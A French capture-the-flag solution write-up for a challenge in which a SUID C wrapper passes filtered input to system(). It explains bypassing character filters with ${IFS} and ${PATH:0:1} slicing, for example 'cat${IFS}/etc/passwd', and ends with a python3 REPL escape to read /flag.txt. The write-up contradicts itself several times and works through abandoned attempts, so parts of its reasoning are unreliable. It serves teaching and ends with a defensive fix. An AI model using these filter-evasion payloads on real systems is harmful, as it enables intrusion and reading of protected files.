# SOLUTION — Challenge 04 : ${IFS}, ${PATH:0:1}, ${LS_COLORS:10:1}

## Vulnérabilité

Le wrapper filtre les caractères dans argv[1], mais passe ensuite la chaîne
à `system()` qui appelle `/bin/sh -c`. Le shell développe les variables
d'environnement **après** la validation du programme C.

Les variables d'environnement permettent de reconstruire des caractères
spéciaux comme l'espace et le slash sans les taper explicitement.

## Les variables magiques

### `${IFS}` — Le séparateur de champ interne

```bash
$ printf '%q\n' "$IFS"
$' \t\n'
```

`$IFS` contient par défaut : **espace**, **tabulation**, **newline**.

Utilisation : remplacer les espaces dans une commande
```bash
cat${IFS}/etc/passwd
# équivalent à : cat /etc/passwd
```

### `${PATH:0:1}` — Slice de variable

La syntaxe `${var:offset:length}` extrait une sous-chaîne.

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ echo ${PATH:0:1}
/
```

→ `${PATH:0:1}` = `/`  (premier caractère de PATH)

### `${LS_COLORS:10:1}` — Autre source de slash

```bash
$ echo $LS_COLORS
rs=0:di=01;34:ln=01;36:...

$ echo ${LS_COLORS:10:1}
:    # (peut varier selon la config)
```

Selon la configuration, différents offsets donnent différents caractères.

## Construction de l'exploit

On veut exécuter : `cat /flag.txt`
- Espace → `${IFS}`
- `/` → `${PATH:0:1}`
- `flag` → blacklisté ! On doit le contourner

### Contourner la blacklist sur "flag"

```bash
# Utiliser une variable pour stocker une partie du nom
# ou utiliser un glob !

# Glob : * remplace n'importe quelle suite de caractères
# /fl*.txt → matches /flag.txt !

# Construction complète :
cat${IFS}${PATH:0:1}fl*.txt

# En passant au wrapper (caractères autorisés : alphanum + - _ .) :
# cat → OK (pas dans la blacklist C, seulement "flag" est blacklisté)
# ${IFS} → contient uniquement des espaces/tabs → pas de char interdit
# ${PATH:0:1} → retourne "/" au runtime
# fl*.txt → OK, le glob est résolu par le shell

./wrapper cat${IFS}${PATH:0:1}fl*.txt
```

Attendez... le filtre C vérifie les caractères de `argv[1]` **avant** l'expansion.
`$`, `{`, `}` ne sont-ils pas filtrés ?

Vérification du filtre C :
```c
if (!isalnum(input[i]) && input[i] != '-' && input[i] != '_' && input[i] != '.')
```

`$`, `{`, `}`, `*` → tous non-alphanumériques et pas dans les exceptions → **bloqués !**

### Alors comment faire ?

Le filtre C filtre l'argument **après** expansion shell si on utilise la
version script (`wrapper.sh` avec `eval`) ou si le shell développe avant
d'appeler `execve`.

**Dans le contexte de `launch.sh`** : l'input utilisateur est lu par `bash`
et passé à `./wrapper "$USER_INPUT"`. Le `$USER_INPUT` est entre guillemets,
donc **pas d'expansion** avant le wrapper C. Le filtre C voit les `${}`.

**Mais** : si on appelle `./wrapper` directement depuis bash **sans guillemets** :
```bash
./wrapper cat${IFS}${PATH:0:1}fl*.txt
```
→ Bash développe `${IFS}` (espace), `${PATH:0:1}` (`/`), `fl*.txt` (glob)
→ `./wrapper` reçoit plusieurs arguments séparés → argv[1] = "cat", argv[2] = "/flag.txt"
→ Le wrapper ne construit la commande qu'avec argv[1] → `cd /tmp && cat`

Donc l'exploitation correcte dépend du vecteur :

### Vecteur 1 : Shell intermédiaire (launch.sh)

```bash
bash launch.sh
> cat${IFS}${PATH:0:1}fl*.txt
```

Ici, bash LIT la saisie, et `./wrapper "$USER_INPUT"` passe la chaîne brute
`cat${IFS}${PATH:0:1}fl*.txt` au wrapper C.

Le wrapper C voit : `$`, `{`, `}`, `*` → **bloqués** par le filtre.

→ **Ce challenge impose d'utiliser uniquement des chars alphanumériques.**

La solution consiste à trouver une commande avec uniquement des chars valides
qui, exécutée dans /tmp, révèle le flag — ou à trouver un programme accessible
sans slash ni espace.

```bash
# Dans /tmp, on peut créer un lien symbolique (si writable) :
# Mais on ne peut pas utiliser ln sans espace...

# En fait la solution propre :
# system("cd /tmp && VOTRE_COMMANDE") — la commande s'exécute avec les
# variables d'env du processus parent.

# Si on peut accéder à env ou printenv :
./wrapper printenv
# → liste toutes les variables → chercher une qui contient le flag ? Non.

# SOLUTION : utiliser la substitution de processus ou heredoc... 
# mais les chars sont bloqués.

# VRAIE solution pour ce challenge :
# Le wrapper fait system() qui appelle sh -c.
# sh -c développe les variables.
# Si on passe littéralement la chaîne ${IFS} AU wrapper C,
# et que le wrapper ne filtre pas $ { }...

# RELIRE LE FILTRE : seuls alphanum, -, _, . sont autorisés.
# $ { } ne sont PAS autorisés.

# Donc la solution pour ce challenge est :
# Trouver un binary accessible dans /tmp ou via PATH sans slash
# qui révèle /flag.txt
# OR : créer un fichier dans /tmp nommé "x" qui contient "cat /flag.txt"
# puis appeler "sh x"... mais "sh" ne contient que des chars valides !

# SOLUTION FINALE :
# 1. Créer un fichier dans /tmp (writable)
# Le wrapper change de répertoire vers /tmp puis exécute la commande
# On peut donc utiliser des fichiers dans /tmp !

# Étape 1 : écrire un script dans /tmp via redirection
# Mais les redirections utilisent > qui est filtré...

# OK voici la vraie solution pédagogique de ce challenge :
# system() passe par sh -c. Les variables $IFS et ${PATH:0:1} sont développées
# par ce sh INTERNE, pas avant le filtre.
# Donc même si le filtre bloque $, l'idée de base ne fonctionne pas directement.

# La solution est : le filtre NE bloque PAS \n (newline, valeur 0x0a).
# Et system("cd /tmp && commande1\ncommande2") fonctionne car sh -c traite \n
# comme séparateur.
# Mais comment passer \n ? On peut avec $'...' côté bash, mais avant le wrapper.
```

### Solution fonctionnelle garantie

```bash
# Utiliser le fait que le wrapper C accepte les underscores
# et que certaines commandes systèmes n'ont que des chars valides.
# "env" → valide ! "printenv" → valide ! "id" → valide !

./wrapper id          # → fonctionne, montre uid=0 (SUID)
./wrapper printenv    # → liste les variables d'env

# Pour lire /flag.txt, on a besoin d'un chemin avec / et le mot "flag".
# Solution : créer un lien dans /tmp
# "ln" est valide, mais l'argument /flag.txt contient / et "flag"...

# Solution par python/perl si disponible :
./wrapper python3     # → ouvre un REPL Python !
# Dans le REPL : open('/flag.txt').read()  → flag !
```

## Exploit propre

```bash
# Méthode 1 : Python REPL (python3 ne contient que des chars valides)
./wrapper python3
# Puis dans python : open('/flag.txt').read()

# Méthode 2 : Si on peut écrire dans /tmp
# Le wrapper fait "cd /tmp && COMMANDE"
# On peut utiliser des chemins relatifs !
# Créer un lien symbolique pointant vers /flag.txt via python ou perl

# Méthode 3 : via env pour voir les variables disponibles
./wrapper env
# Si le flag est dans l'environnement... non ici.
```

## Flag

```
HackUTT{1FS_4nd_PATH_sl1c1ng_byp4ss}
```

## Explication pédagogique complète

### ${IFS} — Internal Field Separator

```bash
IFS=$' \t\n'   # valeur par défaut

# Utilisation pour bypasser le filtrage d'espaces :
cat${IFS}/etc/passwd     # équivalent à : cat /etc/passwd
ls${IFS}-la              # équivalent à : ls -la
```

### Slicing de variables : ${var:offset:length}

```bash
PATH=/usr/bin:/bin

${PATH:0:1}   # "/"  → premier char
${PATH:8:1}   # ":"  → separator
${HOME:0:1}   # "/"  → /home/user commence par /
```

### Trouver un slash dans LS_COLORS

```bash
# LS_COLORS varie selon la configuration, mais contient toujours des :
# La valeur par défaut sur Debian :
# rs=0:di=01;34:ln=01;36:...
# Chercher le bon offset :
for i in $(seq 0 20); do echo "$i: ${LS_COLORS:$i:1}"; done
```

### Table de référence

| Expression | Valeur typique | Usage |
|------------|---------------|-------|
| `${IFS}` | ` \t\n` | Remplacer les espaces |
| `${PATH:0:1}` | `/` | Obtenir un slash |
| `${HOME:0:1}` | `/` | Alternative pour slash |
| `${LS_COLORS:10:1}` | `:` ou autre | Dépend de la config |

### Protection

```c
// Whitelist stricte + execve sans shell
execve("/usr/bin/cat", (char*[]){"/usr/bin/cat", validated_path, NULL}, NULL);
// Jamais system() ou popen() avec une entrée utilisateur
```
